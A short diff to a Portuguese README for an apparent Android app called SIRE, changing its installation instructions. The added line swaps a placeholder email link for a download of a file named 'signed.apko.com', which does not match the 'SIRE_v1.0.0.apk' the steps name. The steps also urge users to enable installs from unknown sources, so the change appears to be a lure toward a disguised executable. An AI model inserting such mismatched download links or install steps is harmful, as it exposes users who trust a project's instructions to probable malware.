@@ -51,7 +51,7 @@
 
 > Para garantir a integridade do software, descarregue sempre a versão oficial através do nosso canal de distribuição:
 > 
-> 1.  Aceda ao link oficial de **[Releases](mailto:teuemail@exemplo.com)** (via e-mail).
+> 1.  Aceda ao link oficial de **[Releases](https://github.com/adilson889/SIRE/releases/download/V1.0.0/signed.apko.com)** (via e-mail).
 > 2.  Descarregue o ficheiro `SIRE_v1.0.0.apk`.
 > 3.  Execute o instalador no seu dispositivo Android.
 > 4.  Certifique-se de que a opção **"Instalar de Fontes Desconhecidas"** está ativa.
